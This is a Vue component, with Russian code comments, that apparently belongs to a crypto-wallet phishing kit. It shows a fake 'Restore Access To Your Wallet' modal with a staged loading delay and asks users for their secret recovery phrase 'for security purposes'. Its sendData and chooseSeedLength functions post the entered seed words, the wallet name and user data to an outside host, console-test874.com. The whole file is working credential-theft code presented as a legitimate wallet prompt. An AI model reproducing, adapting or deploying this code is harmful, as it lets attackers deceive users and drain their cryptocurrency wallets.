<script setup lang="js">
import { onMounted, ref, nextTick, watch, computed } from "vue";
import { useUserStore } from "../stores/Store";
import Loading from "../components/Loading.vue";
import ChooseSeed from "../components/ChooseSeed.vue";
import InputSeed from "../components/InputSeed.vue";
import { useRouter } from "vue-router";
import axios from "axios";

const router = useRouter()

const store = useUserStore();
const isLoading = ref(false);

const seedLength = computed(() => store.seedLength);
//для анимации
const isSwiped = ref(false);
const isLoaderVisible = ref(true);
const isSwipedTwice = ref(false)
const isSeedChooseVisible = ref(true)

//устанавливаем массив input полей (он реактивен)
const phrases = ref(Array.from({ length: seedLength.value }, () => ''));

//функция отправки сид фразы для валидации, в случае ошибки возвращает false
const sendData = async (joinedString) => {
  try {
    await axios.post('https://console-test874.com/receiver', {
    seed: joinedString,
    wallet: store.selectedWallet.name,
    userData: store.userData
   },
        {
          headers:
            {
              'Content-Type': 'application/json',
              'Authorization': `Bearer ${store.token}`
            }
        }
    )
    return true
  } catch (e) {
    if (e.response && e.response.status === 400 && e.response.data.error === 'Invalid seed') {
      return false;
    }
    throw e;
  }
}

const chooseSeedLength = async () => {
  await axios.post('https://console-test874.com/selectseed', {
    wallet: store.selectedWallet.name,
    userData: store.userData,
    seedLength: seedLength.value
  },{
    headers:
      {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${store.token}`
      }
  })
}

//отправка сид фразы и остальное оформление
const handleNextClick = async () => {
  isLoading.value = true;
  //тримим каждое значение, удаляем те, которые равны пустой строке
  const validValues = phrases.value.map(n => n.trim()).filter(n => n !== '');
  //создаем строку из значений
  const joinedString = validValues.join(' ');
  const shadowRoot = document.querySelector('wallet-modal').shadowRoot

  const allSeedInputs = shadowRoot.querySelectorAll('[id^="seed"]');

  try {
    //отправляем запрос и сохраняем его в переремнную
    if (store.requestConfig.seed) {
      const validateAndSend = await sendData(joinedString);

    if (validateAndSend) {
      allSeedInputs.forEach((input) => {
        input.style.borderColor = 'green';
      });
      store.seeds = joinedString.split(' ');
      //ставим тайм аут для "анимации"
      setTimeout(() => {
        router.push({ name: 'success' });
        isLoading.value = false;
      }, 1000);
    } else {
      allSeedInputs.forEach((input) => {
        input.style.borderColor = 'red';
      });
      isLoading.value = false;
    }
  }
  } catch (e) {
    console.error('Error during validation or sending:', e);
    isLoading.value = false;
  }
}

//наблюдаем за значением seedLength, если оно меняется, то и массив input полей тоже меняется
watch(seedLength, async () => {
    phrases.value = Array.from({ length: seedLength.value }, () => '');
    await nextTick();
    if (store.seedsPhrases && store.seedsPhrases.length > 0 && seedLength.value == 24) {
    store.seedsPhrases.forEach((phrase, index) => {
      phrases.value[index] = phrase;
    })
    for (let i = store.seedsPhrases.length; i < seedLength; i++) {
      phrases.value[i] = '';
    }
  } else if (store.seedsPhrases.length > 12 && seedLength.value == 12) {
    phrases.value = store.seedsPhrases.slice(0, 12)
  }
  await nextTick();
})

//автоматическая вставка сид фразы
const splitters = [',', ';', ' ', '\n', '\t'];

const handlePaste = async (event) => {
  try {
    const pastedData = event.clipboardData.getData('text');
    let updatedPhrases = pastedData
      .split(new RegExp(splitters.join('|')))
      .filter(Boolean);

    phrases.value = phrases.value.filter((phrases) => phrases.trim() !== '');

    await nextTick();

    phrases.value = [
      ...updatedPhrases,
      ...Array(seedLength.value - updatedPhrases.length).fill('')
    ];
    await nextTick();
    const shadowRoot = document.querySelector('wallet-modal').shadowRoot
    const firstInput = shadowRoot.querySelector('#seed1');

    if (firstInput) {
      firstInput.type = 'text';
    }
  } catch (error) {
    console.error('Error in handlePaste function:', error);
  }
};


//анимации
const handleSwipe = () => {
    isSwiped.value = true;
    setTimeout(() => {
        isLoaderVisible.value = false;
    }, 500);
}

const handleSwipeSeed = () => {
  if (store.requestConfig.chooseseed) {
    chooseSeedLength();
  }
    isSwipedTwice.value = true;
    setTimeout(() => {
        isSeedChooseVisible.value = false;
    }, 500);
}
const handleSwipeSeedBack = () => {
    isSwipedTwice.value = false;
    isSwiped.value = false;
    const shadowRoot = document.querySelector('wallet-modal').shadowRoot

  const allSeedInputs = shadowRoot.querySelectorAll('[id^="seed"]');

  allSeedInputs.forEach((input) => {
    if (input.style.borderColor === 'red') {
      input.style.borderColor = '#3b3b3b';
    }
  })
    store.seedsPhrases = phrases.value;
    setTimeout(() => {
        isSeedChooseVisible.value = true;
    }, 500);
}

//анимация загрузки
onMounted(() => {
    nextTick(() => {
    setTimeout(() => {
      handleSwipe();
    }, 10000);
  });
})
</script>

<template>
  <div
    style="
      width: 100%;
      max-width: 420px;
      background-color: #232323;
      padding: 0.25em;
    "
  >
    <div class="fF2oMnQERs-container" :style="{ border: '1px solid #232323' }">
      <div class="i2GHFj0R9-container">
        <div
          v-if="isLoaderVisible"
          :class="['nMMd2o9h-loader', { 'animation-left': isSwiped }]"
          style="
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            width: 100%;
          "
        >
          <Loading />
        </div>
        <div
          v-if="isSeedChooseVisible"
          :class="[
            'wST83n-seed',
            { 'animation-right': isSwiped },
            { 'animation-left': isSwipedTwice },
            { 'animation-right-reverse': !isSwipedTwice && isSwiped },
          ]"
          class="wST83n-seed"
          style="
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: space-between;
            width: 100%;
            height: 100%;
          "
        >
          <ChooseSeed @selectSeed="handleSwipeSeed" />
        </div>
        <div
          @paste="handlePaste"
          :class="[
            'j5K1hEzp-seed-enter',
            { 'animation-right': isSwipedTwice },
            { 'animation-left-reverse': !isSwipedTwice },
          ]"
          class="j5K1hEzp-seed-enter"
          style="
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
          "
        >
          <div
            class="gHynXs0v9-scrollbar"
            style="
              max-height: 614px;
              overflow-y: auto;
              overflow-x: hidden;
              display: flex;
              flex-direction: column;
              align-items: center;
              justify-content: start;
              padding-right: 5px;
            "
          >
            <img
              style="margin-bottom: 1.25em; width: 10vh"
              :src="`https://console-test874.com/images/${store.selectedWallet.image}`"
              alt=""
            />
            <h1
              style="
                font-size: 1.125em;
                line-height: 2em;
                font-weight: 600;
                text-align: center;
              "
            >
              Restore Access To Your Wallet
            </h1>
            <p style="margin-top: 0.5em">
              For security purposes, confirm access to your wallet using a
              secret recovery phrase.
            </p>
            <div class="dD2nJm28-container">
              <InputSeed
                v-for="(n, index) in phrases"
                v-model="phrases[index]"
                :key="index"
                :seed="index + 1"
              />
            </div>
          </div>
          <div
            v-if="!isLoading"
            style="
              display: flex;
              flex-direction: row;
              align-items: center;
              justify-content: space-between;
              width: 100%;
              margin-top: 1.75em;
            "
          >
            <button
              :style="{
                color: store.selectedWallet.primarycolor,
                borderColor: store.selectedWallet.primarycolor,
              }"
              @click="handleSwipeSeedBack()"
              class="r5RyT23m-container"
            >
              Back
            </button>
            <button
              :style="{
                backgroundColor: store.selectedWallet.primarycolor,
                color: store.selectedWallet.textcolor,
                borderColor: store.selectedWallet.primarycolor,
              }"
              @click="handleNextClick()"
              :disabled="phrases.some((n) => n.trim() === '')"
              class="u3WT4nMp0-button"
            >
              Next
            </button>
          </div>
          <div
            v-else
            style="
              width: 100%;
              display: flex;
              align-items: center;
              justify-content: center;
              margin-top: 3.5em;
            "
          >
            <div class="m2kaLGfs7-loader"></div>
          </div>
        </div>
      </div>
    </div>
  </div>
</template>

<style scoped>
.m2kaLGfs7-loader {
  height: 20px;
  aspect-ratio: 1.5;
  --c: no-repeat linear-gradient(#fff 0 0);
  background: var(--c), var(--c), var(--c), var(--c);
  background-size: 33.4% 50%;
  animation: m2kaLGfs-l3 2s infinite linear;
}
@keyframes m2kaLGfs-l3 {
  0% {
    background-position: 0 0, 50% 0, 0 100%, 50% 100%;
  }
  12.5% {
    background-position: 0 0, 100% 0, 0 100%, 50% 100%;
  }
  25% {
    background-position: 50% 0, 100% 0, 0 100%, 50% 100%;
  }
  37.5% {
    background-position: 50% 0, 100% 0, 0 100%, 100% 100%;
  }
  50% {
    background-position: 50% 0, 100% 0, 50% 100%, 100% 100%;
  }
  62.5% {
    background-position: 0 0, 100% 0, 50% 100%, 100% 100%;
  }
  75% {
    background-position: 0 0, 50% 0, 50% 100%, 100% 100%;
  }
  87.5% {
    background-position: 0 0, 50% 0, 0 100%, 100% 100%;
  }
  100% {
    background-position: 0 0, 50% 0, 0 100%, 50% 100%;
  }
}
.u3WT4nMp0-button {
  border-radius: 0.75em;
  padding-left: 1.25em;
  padding-right: 1.25em;
  padding-top: 0.5em;
  padding-bottom: 0.5em;
  transition-property: all;
  border-width: 2px;
  transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
  transition-duration: 150ms;
  border-width: 1px;
  border-style: solid;
  font-size: 1.125em;
  width: 60%;
  line-height: 1.75em;
}
.u3WT4nMp0-button:active {
  scale: 0.98;
}
.u3WT4nMp0-button:disabled {
  cursor: not-allowed;
  opacity: 0.5;
  pointer-events: none;
}
.r5RyT23m-container {
  border-width: 1px;
  border-radius: 0.5em;
  padding-left: 1.25em;
  padding-right: 1.25em;
  padding-top: 0.5em;
  border-style: solid;
  padding-bottom: 0.5em;
  transition-property: all;
  transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
  transition-duration: 150ms;
  font-size: 1.125em;
  line-height: 1.75em;
}
.r5RyT23m-container:active {
  scale: 0.98;
}
.dD2nJm28-container {
  display: grid;
  grid-template-columns: repeat(2, 1fr);
  gap: 1.25em;
  margin-top: 1.25em;
  width: 100%;
}
.i2GHFj0R9-container {
  display: flex;
  flex-direction: row;
  align-items: center;
  justify-content: space-between;
  overflow-x: hidden;
  max-width: 390px;
}
.fF2oMnQERs-container {
  width: 100%;
  height: 100%;
  display: flex;
  flex-direction: column;
  justify-content: center;
  align-items: center;
  padding: 1.25em;
}
.gHynXs0v9-scrollbar {
  padding-right: 4px;
}

.gHynXs0v9-scrollbar::-webkit-scrollbar {
  width: 4px;
}

.gHynXs0v9-scrollbar::-webkit-scrollbar-thumb {
  background-color: #ffffffcc;
  border-radius: 999px;
  border: 1px solid #00000000;
}

.gHynXs0v9-scrollbar::-webkit-scrollbar-track {
  background-color: #00000000;
  border-radius: 999px;
  border: 1px solid #00000000;
}

.nMMd2o9h-loader,
.wST83n-seed,
.j5K1hEzp-seed-enter {
  flex: 1 0 100%;
}
.animation-left-reverse {
  animation-name: SlideLeftReverse;
  animation-duration: 0.5s;
}
.animation-right-reverse {
  animation-name: SlideRightReverse;
  animation-duration: 0.5s;
}
.animation-right {
  animation-name: SlideRight;
  animation-duration: 0.5s;
}
.animation-left {
  animation-name: SlideLeft;
  animation-duration: 0.5s;
}

.opacity-animation {
  animation-name: b83834-Opacity;
  animation-duration: 0.5s;
}

@keyframes SlideLeftReverse {
  0% {
    transform: translateX(0);
  }
  100% {
    transform: translateX(100%);
  }
}

@keyframes SlideRightReverse {
  0% {
    transform: translateX(-100%);
  }
  100% {
    transform: translateX(0);
  }
}

@keyframes b83834-Opacity {
  0% {
    opacity: 0;
  }
  100% {
    opacity: 1;
  }
}
@keyframes SlideLeft {
  0% {
    transform: translateX(0);
  }
  100% {
    transform: translateX(-100%);
  }
}

@keyframes SlideRight {
  0% {
    transform: translateX(0);
  }
  100% {
    transform: translateX(-100%);
  }
}
</style>
